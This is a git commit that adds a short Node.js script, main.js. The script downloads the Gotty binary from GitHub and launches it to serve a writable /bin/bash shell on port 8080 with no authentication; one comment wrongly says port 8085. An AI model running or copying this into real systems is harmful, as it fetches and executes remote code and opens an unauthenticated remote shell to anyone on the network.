ea1ae16523be2a6282cfd1c817e89162b3a0b67f
ivangabriel21 <103368415+ivangabriel21@users.noreply.github.com>
2023-09-26 18:53:16 -0400

    Create main.js

---
+++ main.js
@@ -0,0 +1,20 @@
+const { exec } = require('child_process');
+
+// Comando para descargar Gotty
+const downloadCommand = 'wget https://github.com/yudai/gotty/releases/download/v2.0.0/gotty_linux_amd64.tar.gz';
+
+// Comando para descomprimir Gotty
+const extractCommand = 'tar -xzvf gotty_linux_amd64.tar.gz';
+
+// Comando para ejecutar Gotty en el puerto 8085
+const gottyCommand = './gotty -w --port 8080 /bin/bash';
+
+// Ejecuta los comandos en serie
+exec(`${downloadCommand} && ${extractCommand} && ${gottyCommand}`, (error, stdout, stderr) => {
+  if (error) {
+    console.error('Error:', error);
+    return;
+  }
+
+  console.log('Gotty is running on port 8080');
+});
